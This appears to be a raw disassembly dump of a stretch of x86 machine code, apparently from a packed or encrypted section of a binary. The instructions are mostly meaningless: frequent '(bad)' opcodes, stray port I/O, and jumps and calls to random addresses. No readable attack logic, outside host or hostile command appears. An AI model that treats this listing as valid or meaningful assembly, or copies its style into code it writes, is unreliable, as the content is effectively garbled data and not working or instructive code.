  40da3a:	or     edi,edi
  40da3c:	fidivr WORD PTR [ebx-0x3a]
  40da3f:	mov    bl,0xd7
  40da41:	or     DWORD PTR [edi+eiz*8+0x5ae71f],0x6a
  40da49:	mov    BYTE PTR [ecx+0x72],bl
  40da4c:	aad    0xf6
  40da4e:	out    0xb3,al
  40da50:	mov    bh,0x83
  40da52:	mov    WORD PTR [edx],es
  40da54:	cdq    
  40da55:	lahf   
  40da56:	add    DWORD PTR [ecx],0x2e51a10f
  40da5c:	sbb    cl,ch
  40da5e:	pop    eax
  40da5f:	jmp    0x40da8a
  40da61:	call   0x186939e9
  40da66:	mov    WORD PTR [eax+eax*1-0x28b07],?
  40da6d:	lea    edx,[edi+0x2735006a]
  40da73:	push   0x161403
  40da78:	(bad)  
  40da79:	mov    eax,0x72fffccb
  40da7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da7f:	mov    al,0x6c
  40da81:	cmc    
  40da82:	pop    esi
  40da83:	push   eax
  40da84:	push   0x410005
  40da89:	(bad)  
  40da8a:	int3   
  40da8b:	mov    dl,0xfe
  40da8d:	xor    al,BYTE PTR [edx+0x5ee1a1e6]
  40da93:	add    BYTE PTR [edx-0x74],bl
  40da96:	test   DWORD PTR [esi+0x75],edi
	...
  40dac0:	add    BYTE PTR [eax],al
  40dac2:	int    0x85
  40dac4:	shl    BYTE PTR [ebp-0x47],1
  40dac7:	test   edi,eax
  40dac9:	je     0x40daae
  40dacb:	es mov ebp,0xff5e7448
  40dad1:	jne    0x40daac
  40dad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad4:	scas   eax,DWORD PTR es:[edi]
  40dad5:	xor    DWORD PTR [edx-0x164a027f],0xffffff80
  40dadc:	std    
  40dadd:	inc    DWORD PTR [ebp-0x7d7c085a]
  40dae3:	or     DWORD PTR [esi-0x1],0x75ff6ee8
  40daea:	sub    DWORD PTR [esi],0xa67d75ff
  40daf0:	data16 cli 
  40daf2:	bound  eax,QWORD PTR [ecx-0x7dcd0e1a]
  40daf8:	std    
  40daf9:	(bad)  
  40dafa:	clc    
  40dafb:	fwait
  40dafc:	cld    
  40dafd:	push   DWORD PTR [edx-0x3e4a00d2]
  40db03:	jg     0x40db02
  40db05:	jmp    FWORD PTR [ebp+0x1c006b13]
  40db0b:	je     0x40db8c
  40db0d:	mov    edi,0xfe1fff13
  40db12:	cmp    esp,ecx
  40db14:	in     eax,0xb4
  40db16:	jo     0x40db22
  40db18:	out    0xfe,al
  40db1a:	xor    al,0x64
  40db1c:	pop    ebx
  40db1d:	add    BYTE PTR [ecx+edi*8],bl
  40db20:	scas   eax,DWORD PTR es:[edi]
  40db21:	mov    bh,0x1a
  40db23:	add    esi,esp
  40db25:	out    0x0,eax
	...
  40db4f:	(bad)  [eax+0x35d5fee5]
  40db55:	adc    eax,DWORD PTR [eax]
  40db57:	imul   edi,ebp,0x9071fed6
  40db5d:	in     eax,0x74
  40db5f:	or     al,0x49
  40db61:	jo     0x40db6f
  40db63:	jmp    0x40db2b
  40db65:	cli    
  40db66:	out    0x69,eax
  40db68:	aaa    
  40db69:	out    0xfe,al
  40db6b:	in     eax,0x35
  40db6d:	idiv   edi
  40db6f:	push   0xe082d70d
  40db74:	arpl   WORD PTR [esi-0x1],cx
  40db77:	dec    ecx
  40db78:	test   al,0xda
  40db7a:	mov    edx,0xae660a0
  40db7f:	fmul   QWORD PTR [esi]
  40db81:	add    BYTE PTR [edi-0x2b],bl
  40db84:	xor    eax,0xea2fff7
  40db89:	adc    ebp,eax
  40db8b:	(bad)  
  40db8c:	mul    esp
  40db8e:	(bad)  
  40db8f:	daa    
  40db90:	mov    ah,0x6e
  40db92:	add    eax,0xbc1baeb
  40db97:	sbb    al,0x99
  40db99:	outs   dx,BYTE PTR ds:[esi]
  40db9a:	or     al,0x84
  40db9c:	mov    bh,0x79
  40db9e:	(bad)  
  40db9f:	jae    0x40db2d
  40dba1:	ret    0x1b74
  40dba4:	sbb    al,0xa7
  40dba6:	inc    edi
  40dba7:	fnsave [ebx-0x1d]
  40dbaa:	je     0x40dbd4
  40dbac:	pop    ebx
  40dbad:	xchg   ecx,eax
  40dbae:	add    bl,BYTE PTR [edi+0xd99d89]
	...
  40dbdc:	adc    eax,0xc8e4e8f5
  40dbe1:	push   esi
  40dbe2:	sub    esi,0x7b85899d
  40dbe8:	fmul   DWORD PTR [esi+0x1bcbb410]
  40dbee:	jmp    0x80cf84d7
  40dbf3:	ficomp WORD PTR [ebp+0x587b6588]
  40dbf9:	adc    eax,0xffffffd9
  40dbfc:	or     BYTE PTR [ecx+ebp*8-0x25],bl
  40dc00:	ins    BYTE PTR es:[edi],dx
  40dc01:	or     BYTE PTR [esi-0x1b],cl
  40dc04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc05:	push   ds
  40dc06:	inc    ebp
  40dc07:	pop    esp
  40dc08:	sbb    al,0x6b
  40dc0a:	jmp    0xb660d012
  40dc0f:	in     al,0xe2
  40dc11:	shl    BYTE PTR [ebx+0x210edaf3],cl
  40dc17:	(bad)  
  40dc19:	fcomp  QWORD PTR ds:0xe59b16e5
  40dc1f:	jg     0x40dba1
  40dc21:	pop    ebx
  40dc22:	jmp    0x14f972a
  40dc27:	pop    esp
  40dc28:	les    eax,FWORD PTR [esi+0xeab03e8]
  40dc2e:	cmc    
  40dc2f:	(bad)  [ecx-0xb]
  40dc32:	call   0xeac47b3a
  40dc37:	hlt    
  40dc38:	cdq    
  40dc39:	mov    edi,0xd41c03e8
  40dc3e:	push   ebx
  40dc3f:	call   0x40dc44
	...
  40dc68:	add    BYTE PTR [ebx],al
  40dc6a:	dec    eax
  40dc6b:	jmp    0xe9247c64
  40dc70:	add    ebx,DWORD PTR [ebx+esi*8]
  40dc73:	jnp    0x40dcd8
  40dc75:	fstp   QWORD PTR [edx+0x0]
  40dc78:	push   ds
  40dc79:	inc    eax
  40dc7a:	es imul ebp,ecx,0x1f
  40dc7e:	push   esp
  40dc7f:	rcr    BYTE PTR ds:0xa17487c1,0xe7
  40dc86:	xchg   DWORD PTR [esi],ecx
  40dc88:	jmp    0x99b564ac
  40dc8d:	xlat   BYTE PTR ds:[ebx]
  40dc8e:	mov    DWORD PTR [edi+0x28],0x9cff318
  40dc95:	fistp  WORD PTR [edx+0x57]
  40dc98:	sub    DWORD PTR [esp+esi*8-0x37eb1701],0xef8c173
  40dca3:	clc    
  40dca4:	rcr    DWORD PTR [esi],cl
  40dca6:	repz (bad) 
  40dca8:	leave  
  40dca9:	pop    esi
  40dcaa:	pop    ebx
  40dcab:	push   edi
  40dcac:	inc    ecx
  40dcad:	outs   dx,BYTE PTR ds:[esi]
  40dcae:	cmc    
  40dcaf:	(bad)  
  40dcb0:	call   0xb4416c51
  40dcb5:	cmp    cl,BYTE PTR [eax+0xef83974]
  40dcbb:	hlt    
  40dcbc:	inc    ecx
  40dcbd:	sbb    ebp,ebx
  40dcbf:	(bad)  
  40dcc0:	outs   dx,DWORD PTR es:[esi]
  40dcc2:	aam    0xcf
  40dcc4:	adc    al,dh
  40dcc6:	pop    es
  40dcc7:	cmp    al,dh
  40dcc9:	xor    bl,BYTE PTR [esi+eax*8-0x15]
	...
  40dcf5:	add    BYTE PTR [ebx+0x1d],ah
  40dcf8:	or     ebx,DWORD PTR [ebx]
  40dcfa:	inc    ebx
  40dcfb:	pop    esi
  40dcfc:	add    bl,0x1f
  40dcff:	push   cs
  40dd00:	out    dx,al
  40dd01:	div    BYTE PTR [ecx]
  40dd03:	imul   edx,DWORD PTR [eax-0x12],0x9
  40dd07:	push   ebx
  40dd08:	call   0xfec95bbb
  40dd0d:	sar    edi,1
  40dd0f:	or     bh,bh
  40dd11:	(bad)  
  40dd12:	jae    0x40dd69
  40dd14:	call   DWORD PTR [eax+esi*2-0x78]
  40dd18:	je     0x40dd1a
  40dd1a:	mov    ch,0x7b
  40dd1c:	jae    0x40dd26
  40dd1e:	dec    ebp
  40dd1f:	lock cld 
  40dd21:	jmp    FWORD PTR [edx-0x333fce86]
  40dd27:	jnp    0x40dd26
  40dd29:	(bad)  
  40dd2a:	jp     0x40dcdc
  40dd2c:	lods   al,BYTE PTR ds:[esi]
  40dd2d:	cmp    BYTE PTR [edx+0x6c],al
  40dd30:	test   DWORD PTR [eax-0x56],ebp
  40dd33:	jnp    0x40dd32
  40dd35:	call   DWORD PTR [eax]
  40dd37:	mov    ds:0x7c1b55e6,eax
  40dd3c:	std    
  40dd3d:	push   DWORD PTR [eax]
  40dd3f:	stos   DWORD PTR es:[edi],eax
  40dd40:	out    0x4d,al
  40dd42:	sub    edi,DWORD PTR [ebp+edi*8-0x1]
  40dd46:	adc    BYTE PTR [ebx+0x79fb45e6],ah
  40dd4c:	std    
  40dd4d:	push   eax
  40dd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd50:	out    0x3d,al
  40dd52:	jmp    0x40ddcd
  40dd54:	std    
  40dd55:	call   eax
  40dd57:	mov    bh,ch
  40dd59:	jne    0x40dd5b
	...
  40dd83:	jmp    0x4d495101
  40dd88:	sub    eax,0x1a2afffe
  40dd8d:	leave  
  40dd8e:	ret    0x5af9
  40dd91:	push   ebp
  40dd92:	mov    ebp,DWORD PTR [ecx]
  40dd94:	faddp  st(2),st
  40dd96:	call   0xff5501c5
  40dd9b:	mov    al,ds:0x9f8de68a
  40dda0:	pop    edx
  40dda1:	add    BYTE PTR [ebx],cl
  40dda3:	add    eax,0xb56a5723
  40dda8:	repnz aam 0x60
  40ddab:	je     0x40de07
  40ddad:	push   DWORD PTR [ebp+0x75]
  40ddb0:	jns    0x40de25
  40ddb2:	or     al,0x6d
  40ddb4:	test   DWORD PTR [edi-0x1],edi
  40ddb7:	push   0x55
  40ddb9:	shl    BYTE PTR [esp+ebx*1+0x33],0x34
  40ddbe:	push   eax
  40ddbf:	test   BYTE PTR [edx-0x768c0177],bh
  40ddc5:	ret    0x2d73
  40ddc8:	or     ecx,DWORD PTR [eax-0x18]
  40ddcb:	imul   BYTE PTR [ecx-0x4a61be16]
  40ddd1:	loope  0x40dddd
  40ddd3:	pop    esp
  40ddd4:	push   0x5bd1feff
  40ddd9:	xor    al,0xe8
  40dddb:	ins    BYTE PTR es:[edi],dx
  40dddc:	repz loope 0x40dddd
  40dddf:	int3   
  40dde0:	aam    0x57
  40dde2:	call   0x898bab3
	...
  40de0f:	add    BYTE PTR [ecx+ebp*4],dh
  40de12:	loopne 0x40de12
  40de14:	and    ebx,esp
  40de16:	int    0x7c
  40de18:	sbb    esi,ebp
  40de1a:	loope  0x40de90
  40de1c:	add    al,0x2c
  40de1e:	(bad)  
  40de1f:	jl     0x40de2c
  40de21:	and    eax,0x2d81bdeb
  40de26:	loop   0x40de8f
  40de28:	sbb    al,0x7c
  40de2a:	add    al,BYTE PTR [eax]
  40de2c:	add    al,0x49
  40de2e:	pusha  
  40de2f:	(bad)  
  40de30:	jmp    0x40de3c
  40de32:	dec    eax
  40de33:	clc    
  40de34:	xchg   ecx,eax
  40de35:	mov    dh,0xde
  40de37:	dec    edi
  40de38:	fcmovne st,st(6)
  40de3a:	repnz dec BYTE PTR [ecx-0x70]
  40de3e:	jmp    0xdc0b:0x27435d3
  40de45:	out    0x52,al
  40de47:	(bad)  
  40de48:	popa   
  40de49:	add    eax,DWORD PTR fs:[eax]
  40de4c:	sbb    al,0x74
  40de4e:	leave  
  40de4f:	inc    esp
  40de50:	mov    al,0x84
  40de52:	or     BYTE PTR [eax],al
  40de54:	sbb    al,0xda
  40de56:	add    ch,BYTE PTR [edx+0x1c]
  40de59:	fiadd  DWORD PTR [edx]
  40de5b:	push   0x1c
  40de5d:	pop    ebx
  40de5e:	je     0x40dea7
  40de60:	nop
  40de61:	sub    bl,dh
  40de63:	push   edi
  40de64:	test   BYTE PTR [ebp+0xf7ad45b],al
  40de6a:	int    0xec
  40de6c:	shl    ebx,0xe8
  40de6f:	add    edx,DWORD PTR [edi]
  40de71:	fwait
  40de72:	xor    al,0x6
	...
  40de9c:	add    BYTE PTR [edi+0x40],dh
  40de9f:	inc    ecx
  40dea0:	lahf   
  40dea1:	jecxz  0x40debe
  40dea3:	jmp    0x91aba788
  40dea8:	push   es
  40dea9:	popf   
  40deaa:	test   DWORD PTR [ebp+0x3882c8e1],ebx
  40deb0:	in     al,dx
  40deb1:	call   0xa5226c91
  40deb6:	pop    ds
  40deb7:	xchg   ebp,eax
  40deb8:	loope  0x40de6a
  40deba:	bound  edi,QWORD PTR [esi+0x57]
  40debd:	or     BYTE PTR [esi+0xf1aeffb],al
  40dec3:	fucom  st(0)
  40dec5:	mov    BYTE PTR [ebx+0x51],dl
  40dec8:	sti    
  40dec9:	or     al,BYTE PTR [ebp+0x7788e15d]
  40decf:	inc    eax
  40ded0:	sbb    eax,0xe14d8479
  40ded5:	pop    eax
  40ded6:	mov    edx,DWORD PTR [ecx-0x7f]
  40ded9:	jmp    0xe8f2:0x45ec3d0e
  40dee0:	add    ebx,ebx
  40dee2:	push   cs
  40dee3:	xor    esp,ebp
  40dee5:	stc    
  40dee6:	add    eax,0x99d4e126
  40deeb:	hlt    
  40deec:	add    ebp,DWORD PTR [ecx-0x30]
  40deef:	add    al,0x83
  40def1:	fisttp WORD PTR [edi-0xe4d1ef2]
  40def7:	call   0x73c4df69
  40defc:	or     esi,DWORD PTR [esi+ebx*1+0x7300]
	...
  40df27:	add    BYTE PTR [eax],al
  40df29:	add    BYTE PTR [ebp+eax*4-0x78],bh
  40df2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df2e:	jae    0x40decd
  40df30:	add    al,0x91
  40df32:	call   FWORD PTR [ecx]
  40df34:	add    cl,ch
  40df36:	pop    ds
  40df37:	pop    ebx
  40df38:	add    BYTE PTR [edx+eiz*4-0x73],ah
  40df3c:	std    
  40df3d:	into   
  40df3e:	jl     0x40df54
  40df40:	push   0x5b1eed
  40df45:	shr    DWORD PTR [esp+edi*8+0xbc7e8ff],1
  40df4c:	popa   
  40df4d:	sub    BYTE PTR [eax],bl
  40df4f:	rep outs dx,BYTE PTR ds:[esi]
  40df51:	or     bh,bl
  40df53:	pop    edx
  40df54:	push   0x19be70
  40df59:	xchg   esi,eax
  40df5a:	adc    bh,BYTE PTR [edx+0x47]
  40df5d:	sub    BYTE PTR [eax],bl
  40df5f:	test   BYTE PTR [ecx+esi*8+0x37],dh
  40df63:	mov    esp,0xfc3c7efd
  40df68:	jbe    0x40df72
  40df6a:	pop    edi
  40df6b:	pop    ebx
  40df6c:	push   0x1a7efe
  40df71:	rcl    DWORD PTR [esi+0x77e940fa],1
  40df77:	pop    ecx
  40df78:	add    cl,ch
  40df7a:	lahf   
  40df7b:	test   BYTE PTR [ecx+eiz*8+0x7],dh
  40df7f:	sar    ch,1
  40df81:	inc    esi
  40df82:	cld    
  40df83:	(bad)  
  40df84:	test   BYTE PTR [esi],dh
  40df86:	std    
  40df87:	test   dh,bh
  40df89:	cdq    
  40df8a:	(bad)  
  40df8b:	sub    ebp,DWORD PTR [eax-0x17]
	...
  40dfb6:	add    BYTE PTR [edi],bl
  40dfb8:	test   BYTE PTR [ebp+eiz*1-0x44],dh
  40dfbc:	push   cs
  40dfbd:	or     BYTE PTR [ecx],dl
  40dfbf:	ret    0xff01
  40dfc2:	push   ss
  40dfc3:	out    0x99,al
  40dfc5:	add    ebp,ecx
  40dfc7:	jmp    0xf29c:0x3400ebcf
  40dfce:	(bad)  
  40dfcf:	mov    ds:0x9f0068a3,al
  40dfd4:	cmp    al,0xff
  40dfd6:	jne    0x40e055
  40dfd8:	outs   dx,DWORD PTR ds:[esi]
  40dfd9:	mov    esp,0x87a38279
  40dfde:	inc    ebp
  40dfdf:	popa   
  40dfe0:	lock sbb eax,ebp
  40dfe3:	mov    ecx,0x7efffdde
  40dfe8:	xchg   edi,eax
  40dfe9:	jb     0x40e00f
  40dfeb:	int    0x2b
  40dfed:	popa   
  40dfee:	inc    ecx
  40dfef:	jne    0x40e038
  40dff1:	call   0xfde4a556
  40dff6:	push   eax
  40dff7:	fstp   QWORD PTR [esi+0x10]
  40dffa:	out    dx,eax
  40dffb:	ret    
  40dffc:	idiv   BYTE PTR [edx+0x505ef461]
  40e002:	call   FWORD PTR [eax]
  40e004:	push   edi
  40e005:	call   0xfde4b855
  40e00a:	call   0x3fdb18
  40e00f:	jp     0x40e062
  40e011:	test   al,0x60
  40e013:	inc    esp
  40e014:	push   edi
  40e015:	add    DWORD PTR [eax],eax
  40e017:	add    eax,0x858d5f
	...
  40e044:	push   0xffffffa1
  40e046:	std    
  40e047:	inc    ebp
  40e049:	test   BYTE PTR [ebx],0x1
  40e04c:	add    eax,0xdaf9e85f
  40e051:	pop    esi
  40e052:	add    BYTE PTR [eax-0x56],ch
  40e055:	test   DWORD PTR [eax+0x0],0x4160f1cd
  40e05c:	(bad)
  40e05f:	popa   
  40e060:	test   BYTE PTR [esi-0x1],bl
  40e063:	xor    eax,0x410f14
  40e068:	and    ah,BYTE PTR [eax+ecx*1]
  40e06b:	call   0xff22468c
  40e070:	mov    bl,0xdc
  40e072:	push   ebp
  40e073:	popa   
  40e074:	pop    ebp
  40e075:	je     0x40e0e1
  40e077:	outs   dx,DWORD PTR ds:[esi]
  40e078:	cmp    eax,0xa56802b3
  40e07d:	rol    DWORD PTR [ebx+0x0],cl
  40e080:	add    al,0x76
  40e082:	add    al,BYTE PTR [eax]
  40e084:	pushf  
  40e085:	jns    0x40e0de
  40e087:	or     BYTE PTR [edx+ecx*8-0x21],dh
  40e08b:	(bad)  
  40e08c:	jnp    0x40e085
  40e08e:	xchg   esi,esi
  40e090:	jb     0x40e023
  40e092:	fisttp QWORD PTR [edi+0x74]
  40e095:	(bad)  
  40e096:	add    BYTE PTR gs:[ecx+eax*8],bl
  40e09a:	push   edi
  40e09b:	cld    
  40e09c:	pop    ebx
  40e09d:	aas    
  40e09e:	or     al,0xe8
  40e0a0:	mov    ebx,0x55fedf4a
  40e0a5:	mov    dh,0x6
	...
  40e0cf:	add    BYTE PTR [eax],al
  40e0d1:	jmp    0x60c1cfe2
  40e0d6:	loopne 0x40e0b4
  40e0d8:	(bad)  
  40e0d9:	xor    ebx,DWORD PTR [esi+0x4]
  40e0dc:	push   0x2
  40e0de:	fst    DWORD PTR [edi+0x8]
  40e0e1:	xor    al,0x8c
  40e0e3:	pop    ebx
  40e0e4:	call   FWORD PTR [ebx]
  40e0e6:	sti    
  40e0e7:	inc    edi
  40e0e8:	cld    
  40e0e9:	(bad)  [esi-0x56]
  40e0ec:	pop    edi
  40e0ed:	pop    ebp
  40e0ee:	je     0x40e0f2
  40e0f0:	add    BYTE PTR [esp+esi*2],bl
  40e0f3:	pop    DWORD PTR [ebx+esi*8+0x4cfede29]
  40e0fa:	pushf  
  40e0fb:	push   es
  40e0fc:	add    DWORD PTR [esp+esi*2],ebx
  40e0ff:	jmp    0xf268:0x2747b71
  40e106:	xchg   edx,eax
  40e107:	inc    ebx
  40e108:	add    BYTE PTR [eax+eiz*2+0x64],al
  40e10c:	inc    ecx
  40e10d:	sbb    al,0x5b
  40e10f:	xchg   ecx,eax
  40e110:	mov    WORD PTR [esp+ebx*1],?
  40e113:	jmp    0xa0bcd1f6
  40e118:	inc    esp
  40e119:	sbb    al,0x82
  40e11b:	xchg   ebx,eax
  40e11c:	or     esi,DWORD PTR [ebp+esi*8-0xd5d21fd]
  40e123:	push   ss
  40e124:	fstp   QWORD PTR fs:[edx-0x7f]
  40e128:	iret   
  40e129:	cld    
  40e12a:	sbb    ebp,ecx
  40e12c:	imul   edx,DWORD PTR [ebp-0xbfbd805],0x5c
  40e133:	jmp    0x40e13b
	...
  40e15c:	add    BYTE PTR [eax],al
  40e15e:	pushf  
  40e15f:	sbb    DWORD PTR [ebx+0xc],0xddcc1184
  40e166:	push   0xffffffcf
  40e168:	imul   edx,ebp,0x61
  40e16b:	cmp    DWORD PTR [ebp+0x4e654434],0x33821c04
  40e175:	loopne 0x40e1c1
  40e177:	pop    es
  40e178:	icebp  
  40e179:	jmp    0x40e1de
  40e17b:	add    bl,BYTE PTR [esi-0x13639b23]
  40e181:	add    ecx,ecx
  40e183:	aad    0x7c
  40e185:	sbb    DWORD PTR [edi-0x7a],0xffffff86
  40e189:	frstor [edx]
  40e18b:	hlt    
  40e18c:	call   0xfbc124fa
  40e191:	or     eax,DWORD PTR [ebx+ebx*8]
  40e194:	lock fmul QWORD PTR [edx]
  40e197:	shr    DWORD PTR [ebx-0x6ea92521],cl
  40e19d:	fs pop ebp
  40e19f:	pop    ebx
  40e1a0:	jmp    0x5c9bfda8
  40e1a5:	xchg   edx,esi
  40e1a7:	add    DWORD PTR [ebp-0x23],0x2e4f353
  40e1ae:	sbb    al,0x5b
  40e1b0:	add    BYTE PTR [ecx-0x3b],al
  40e1b3:	idiv   bh
  40e1b5:	call   0xa8a16cf1
  40e1ba:	pop    ds
  40e1bb:	repz jmp 0x689c4049
  40e1c1:	pusha  
	...
  40e1ea:	add    BYTE PTR [edi],bh
  40e1ec:	sbb    al,BYTE PTR [eax]
  40e1ee:	push   cs
  40e1ef:	adc    edi,DWORD PTR [edx+0x47]
  40e1f2:	test   al,0x1f
  40e1f4:	xor    BYTE PTR [ecx+esi*8-0x79],0x7c
  40e1f9:	sti    
  40e1fa:	div    BYTE PTR [eax-0x8]
  40e1fd:	out    dx,eax
  40e1fe:	mov    dh,bl
  40e200:	pop    edx
  40e201:	push   0x19fed3
  40e206:	push   ecx
  40e207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e208:	sti    
  40e209:	inc    eax
  40e20a:	jmp    0xe9413f16
  40e20f:	lahf   
  40e210:	xor    DWORD PTR [ecx+esi*8+0x77],0x78befb98
  40e218:	iret   
  40e219:	test   BYTE PTR [esi+0x19fe8171],bh
  40e21f:	cmp    ah,ch
  40e221:	gs jmp 0x9db56246
  40e227:	pop    eax
  40e228:	pop    es
  40e229:	or     BYTE PTR [ecx-0x7100fd0a],al
  40e22f:	push   esi
  40e230:	call   0x68eb:0xd3eae903
  40e237:	jecxz  0x40e1c4
  40e239:	std    
  40e23a:	jbe    0x40e22c
  40e23c:	icebp  
  40e23d:	inc    DWORD PTR [edx]
  40e23f:	cmp    BYTE PTR [eax-0x7e080e8c],al
  40e245:	jbe    0x40e2a5
  40e247:	fcom   st(2)
  40e249:	inc    esp
  40e24a:	push   ebp
  40e24b:	fcom   DWORD PTR [esi-0x58]
  40e24e:	leave  
	...
  40e277:	add    BYTE PTR [esi+0x5b],bl
  40e27a:	add    BYTE PTR [eax],al
  40e27c:	cmc    
  40e27d:	pop    ebx
  40e27e:	add    BYTE PTR [ebp-0x358c0],cl
  40e284:	or     cl,BYTE PTR [eax+ebp*2+0x4]
  40e288:	mov    ah,0x5b
  40e28a:	add    al,ch
  40e28c:	xchg   ecx,eax
  40e28d:	cmc    
  40e28e:	(bad)  
  40e28f:	dec    DWORD PTR [ebp-0x3abe9dad]
  40e295:	repz jmp DWORD PTR [ecx+0x74]
  40e299:	pop    ebx
  40e29a:	push   0x1c9489
  40e29f:	call   eax
  40e2a1:	jl     0x40e2e9
  40e2a3:	inc    ecx
  40e2a4:	test   DWORD PTR [esi+0x411d0873],ebx
  40e2aa:	cld    
  40e2ab:	(bad)  
  40e2ac:	jp     0x40e29c
  40e2ae:	pop    es
  40e2af:	bound  eax,QWORD PTR [edi+edx*2+0x68]
  40e2b3:	add    bh,ah
  40e2b5:	adc    eax,0xf5fc6800
  40e2ba:	inc    eax
  40e2bb:	add    ch,cl
  40e2bd:	pop    eax
  40e2be:	add    BYTE PTR [eax],al
  40e2c0:	lds    esp,FWORD PTR [ebx+0x155d0873]
  40e2c6:	cld    
  40e2c7:	(bad)  
  40e2c8:	jp     0x40e29b
  40e2ca:	xor    edi,0x7b
  40e2cd:	mov    ds:0x518d50fd,eax
  40e2d2:	data16 add BYTE PTR [ebp-0x5c],al
  40e2d6:	jae    0x40e2d4
  40e2d8:	call   0x0:0xe80829
	...
  40e303:	add    BYTE PTR [eax],al
  40e305:	xchg   DWORD PTR [ebx],ebp
  40e307:	(bad)  
  40e308:	dec    esp
  40e30a:	xchg   ebp,eax
  40e30b:	add    al,BYTE PTR [eax]
  40e30d:	xor    dh,cl
  40e30f:	jmp    0xef00:0x68a3c183
  40e316:	das    
  40e317:	push   DWORD PTR [ebp-0x13]
  40e31a:	jb     0x40e390
  40e31c:	ja     0x40e33a
  40e31e:	and    eax,0x106188db
  40e323:	outs   dx,BYTE PTR ds:[esi]
  40e324:	add    BYTE PTR [edi+eiz*2+0x66],dh
  40e328:	inc    ecx
  40e329:	sbb    al,0xac
  40e32b:	std    
  40e32c:	popa   
  40e32d:	pop    ebp
  40e32e:	je     0x40e309
  40e330:	xor    al,0xbd
  40e332:	mov    esp,0x78b40043
  40e337:	push   edi
  40e338:	(bad)  
  40e339:	mov    ebx,0x1573c289
  40e33e:	les    ebp,FWORD PTR [edx+0x0]
  40e341:	sbb    al,0x7d
  40e343:	cwde   
  40e344:	addr16 loope 0x40e318
  40e347:	inc    ebx
  40e348:	add    ah,ch
  40e34a:	jl     0x40e39b
  40e34c:	or     BYTE PTR [esi+eax*4+0x5c8bfea4],al
  40e353:	add    edi,DWORD PTR [edx-0x7d]
  40e356:	jne    0x40e3c4
  40e358:	add    BYTE PTR [eax+ebp*2],al
  40e35b:	inc    cx
  40e35d:	sbb    al,0x1c
  40e35f:	jmp    DWORD PTR [ecx-0x23]
  40e362:	jae    0x40e33d
  40e364:	xor    al,0x7d
  40e366:	dec    esp
  40e367:	inc    ebp
	...
  40e390:	add    BYTE PTR [eax],al
  40e392:	inc    esp
  40e393:	mov    WORD PTR [edi-0x1],ss
  40e396:	push   ebx
  40e397:	jns    0x40e35b
  40e399:	jae    0x40e3c0
  40e39b:	fs ins BYTE PTR es:[edi],dx
  40e39d:	add    BYTE PTR [eiz*8+0x51f96798],bl
  40e3a4:	inc    ebp
  40e3a5:	add    ah,cl
  40e3a7:	in     al,0x4f
  40e3a9:	or     BYTE PTR [edx+edi*4],dh
  40e3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3ad:	(bad)  
  40e3ae:	and    ebp,esp
  40e3b0:	mov    ch,0x78
  40e3b2:	sbb    edi,ebp
  40e3b4:	fnstenv [eax+edx*1+0x5]
  40e3b8:	push   eax
  40e3b9:	or     ah,dh
  40e3bb:	xor    eax,0x5b03ff53
  40e3c0:	xor    ch,al
  40e3c2:	pop    ds
  40e3c3:	pop    ebx
  40e3c4:	mov    ah,0x8e
  40e3c6:	pop    es
  40e3c7:	fisubr DWORD PTR [edi+edx*8]
  40e3ca:	push   ecx
  40e3cb:	es ret 
  40e3cd:	add    esi,DWORD PTR [esi+0x31]
  40e3d0:	inc    esi
  40e3d1:	push   eax
  40e3d2:	and    al,0x73
  40e3d4:	push   eax
  40e3d5:	push   ecx
  40e3d6:	sar    DWORD PTR [ebp+0x5f],cl
  40e3d9:	inc    eax
  40e3da:	enter  0xe8f0,0xeb
  40e3de:	sar    edi,0x25
  40e3e1:	fisub  DWORD PTR [esi]
  40e3e3:	fwait
  40e3e4:	xchg   esp,eax
  40e3e5:	cld    
  40e3e6:	arpl   bx,si
  40e3e8:	call   0x80fd9ef0
  40e3ed:	dec    ebp
  40e3ee:	ds sbb al,0xe9
  40e3f1:	xor    ebx,DWORD PTR [ebx+0xebf107]
	...
  40e41f:	adc    edi,DWORD PTR [ecx-0x2c7c260b]
  40e425:	outs   dx,DWORD PTR ds:[esi]
  40e426:	fiadd  DWORD PTR [edx-0x1ba0e42f]
  40e42c:	sbb    ebp,ecx
  40e42e:	mov    WORD PTR [eax],?
  40e430:	hlt    
  40e431:	and    BYTE PTR [ebx+0x1c],al
  40e434:	fisttp DWORD PTR ds:0x5117e804
  40e43a:	xor    DWORD PTR [esi+0x4430e91b],edi
  40e440:	jnp    0x40e48d
  40e442:	add    al,0x1c
  40e444:	push   edx
  40e445:	test   eax,0x91252350
  40e44a:	setg   BYTE PTR [ebp-0x63]
  40e44e:	xor    al,0xc4
  40e450:	pop    edx
  40e451:	jmp    0x23334e3e
  40e456:	data16 fstp QWORD PTR [edx+0x19]
  40e45a:	fst    DWORD PTR [eax-0x41bc6ead]
  40e460:	jl     0x40e461
  40e462:	jne    0x40e45c
  40e464:	adc    bh,BYTE PTR [ecx+0x6e]
  40e467:	in     eax,0x71
  40e469:	add    BYTE PTR [edi-0x2bffc161],ch
  40e46f:	rcl    DWORD PTR [esi],1
  40e471:	cld    
  40e472:	sbb    ah,al
  40e474:	ret    
  40e475:	dec    BYTE PTR [esi-0x3b]
  40e478:	jge    0x40e46b
  40e47a:	xchg   edi,eax
  40e47b:	cmp    BYTE PTR [ebp+esi*2-0x7e],dl
  40e47f:	cmc    
  40e480:	pop    es
  40e481:	cld    
  40e482:	add    BYTE PTR ss:[eax],al
	...
  40e4a9:	add    BYTE PTR [eax],al
  40e4ab:	add    BYTE PTR [ebx+0x53],bl
  40e4ae:	call   0xfebd533a
  40e4b3:	(bad)  
  40e4b4:	cmc    
  40e4b5:	xchg   ecx,eax
  40e4b6:	shl    ebp,0x1f
  40e4b9:	mov    eax,DWORD PTR es:0xb7fb98a1
  40e4c0:	in     al,dx
  40e4c1:	lock call DWORD PTR [edx-0xe8b83b8]
  40e4c8:	xchg   DWORD PTR [esi],edx
  40e4ca:	jbe    0x40e4c2
  40e4cc:	rol    DWORD PTR fs:[ebp+ebp*8-0x70],cl
  40e4d1:	inc    edi
  40e4d2:	gs xor edi,ebx
  40e4d5:	pop    edx
  40e4d6:	mov    ebx,DWORD PTR [edi+eax*1]
